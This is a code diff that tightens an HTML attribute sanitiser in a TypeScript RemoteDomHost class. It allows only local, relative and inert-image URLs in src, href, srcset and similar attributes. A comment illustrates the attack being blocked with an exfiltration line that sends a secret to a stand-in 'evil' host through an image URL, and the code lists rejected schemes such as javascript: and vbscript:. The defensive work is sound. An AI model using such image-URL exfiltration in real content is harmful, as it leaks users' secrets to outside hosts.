@@ -91,6 +91,27 @@ const ALLOWED_PER_TAG_ATTRIBUTES: Record<string, ReadonlySet<string>> = {
   fieldset: new Set(['disabled', 'form', 'name']),
 };
 
+/**
+ * §9 rule 3: URL-bearing attributes whose VALUE must be validated as LOCAL before it
+ * reaches the host DOM. `src`/`poster`/`srcset` are PASSIVE asset contexts (an inert
+ * `data:` image is allowed); `href`/`action`/`formaction`/`xlink:href` are navigational
+ * and never take `data:`. Any attribute here pointed at a remote origin is a host-origin
+ * GET-exfil channel (the host page has no CSP), so it is rejected.
+ */
+const URL_VALUE_ATTRIBUTES = new Set([
+  'src', 'poster', 'srcset', 'href', 'action', 'formaction', 'xlink:href',
+]);
+
+/** Subset of {@link URL_VALUE_ATTRIBUTES} that are PASSIVE image/media contexts (inert data: OK). */
+const PASSIVE_URL_ATTRIBUTES = new Set(['src', 'poster', 'srcset']);
+
+/**
+ * An INERT-image `data:` URL: a raster image type that cannot execute script. SVG is
+ * DELIBERATELY excluded (`data:image/svg+xml` can carry `<script>`/`onload=`), as is any
+ * non-image/data: — matching the iframe CSP's img-src data: allowance for passive assets.
+ */
+const INERT_IMAGE_DATA_RE = /^data:image\/(png|jpeg|jpg|gif|webp|bmp|avif|x-icon|vnd\.microsoft\.icon)[;,]/i;
+
 // ---------------------------------------------------------------------------
 // Forwarded guest event shape
 // ---------------------------------------------------------------------------
@@ -318,22 +339,75 @@ export class RemoteDomHost {
    * Attribute allowlist check.
    * Blocks:
    *   1. Any attribute starting with "on" (event handler as string).
-   *   2. `href`/`src`/`action`/`formaction` with a `javascript:` scheme.
+   *   2. URL-bearing attributes (`href`/`src`/`poster`/`srcset`/`action`/`formaction`/
+   *      `xlink:href`) whose VALUE is not LOCAL — see {@link #isUrlValueAllowed} (§9 rule 3).
    *   3. Any attribute not in the global or per-tag allowlist.
    */
   #isAttributeAllowed(tag: string, name: string, value: string): boolean {
     const lname = name.toLowerCase();
     // Block all on* event handlers (e.g. onclick, onmouseover, onerror)
     if (lname.startsWith('on')) return false;
-    // Block dangerous URI schemes (javascript:, data:, vbscript:) in URL
-    // attributes — defense-in-depth against script execution and data-URI XSS.
-    if (['href', 'src', 'action', 'formaction', 'xlink:href'].includes(lname)) {
-      if (/^\s*(javascript|data|vbscript)\s*:/i.test(value)) return false;
+    // §9 rule 3: RemoteDomHost renders in the HOST page, OUTSIDE any iframe CSP (the
+    // Lab drives it over a host-page container with no page CSP). A URL-bearing
+    // attribute pointed at a REMOTE origin is a covert host-origin GET the guest
+    // controls (`img.src='https://evil/?'+secret`) — an exfil channel connect-src
+    // 'none' inside the iframe cannot stop. So URL VALUES, not only element/attr
+    // TYPES, are validated: only LOCAL values (blob:, inert data: for passive assets,
+    // same-origin/relative) reach the DOM; anything remote / unparseable is REJECTED.
+    if (URL_VALUE_ATTRIBUTES.has(lname)) {
+      const passive = PASSIVE_URL_ATTRIBUTES.has(lname);
+      if (lname === 'srcset') {
+        if (!this.#isSrcsetAllowed(value)) return false;
+      } else if (!this.#isUrlValueAllowed(value, passive)) {
+        return false;
+      }
     }
     if (ALLOWED_GLOBAL_ATTRIBUTES.has(lname)) return true;
     const perTag = ALLOWED_PER_TAG_ATTRIBUTES[tag];
     if (perTag?.has(lname)) return true;
     return false;
+  }
+
+  /**
+   * §9 rule 3 URL-value validator (fail closed). A URL is LOCAL (allowed) iff it is:
+   *   - a `blob:` URL (a guest-produced local object — first-party apps render these),
+   *   - for a PASSIVE asset attr (img/media `src`/`poster`), an INERT-image `data:` URL
+   *     (`data:image/{png,jpeg,gif,webp,bmp,avif};…`) — NOT `data:image/svg+xml` (SVG can
+   *     script) and NOT any non-image/data: (matches §5's img-src data: allowance), OR
+   *   - a same-origin / relative URL: no scheme (`local.png`, `./a`, `?q`, `#f`) or a
+   *     root-relative path `/x` — but NOT a protocol-relative `//host` (that is remote).
+   * Everything else — `http:`, `https:`, `ws(s):`, `ftp:`, `//host`, `javascript:`,
+   * `vbscript:`, non-inert `data:`, or an unparseable value — is REMOTE/unsafe → REJECTED.
+   */
+  #isUrlValueAllowed(raw: string, passive: boolean): boolean {
+    const value = raw.trim();
+    if (value === '') return true; // empty attr is inert
+    // Protocol-relative `//host…` is REMOTE (inherits the host page's scheme).
+    if (value.startsWith('//')) return false;
+    // A leading scheme (`foo:`) — classify it. No scheme → relative/same-origin (allowed).
+    const scheme = /^([a-z][a-z0-9+.-]*):/i.exec(value)?.[1]?.toLowerCase();
+    if (!scheme) return true; // relative path / query / fragment — same-origin, local
+    if (scheme === 'blob') return true;
+    if (scheme === 'data') return passive && INERT_IMAGE_DATA_RE.test(value);
+    // http/https/ws/wss/ftp/javascript/vbscript/file/… — remote or unsafe → reject.
+    return false;
+  }
+
+  /**
+   * §9 rule 3 for `srcset`: a comma-separated list of `url [descriptor]` candidates.
+   * EVERY candidate URL must be LOCAL (see {@link #isUrlValueAllowed}); one remote
+   * candidate poisons the whole attribute (fail closed). srcset is always a passive
+   * image context, so the inert-data: allowance applies.
+   */
+  #isSrcsetAllowed(value: string): boolean {
+    const candidates = value.split(',').map((c) => c.trim()).filter((c) => c !== '');
+    if (candidates.length === 0) return true;
+    for (const candidate of candidates) {
+      // The URL is the first whitespace-delimited token; the rest is a descriptor.
+      const url = candidate.split(/\s+/, 1)[0];
+      if (!this.#isUrlValueAllowed(url, true)) return false;
+    }
+    return true;
   }
 
   /**
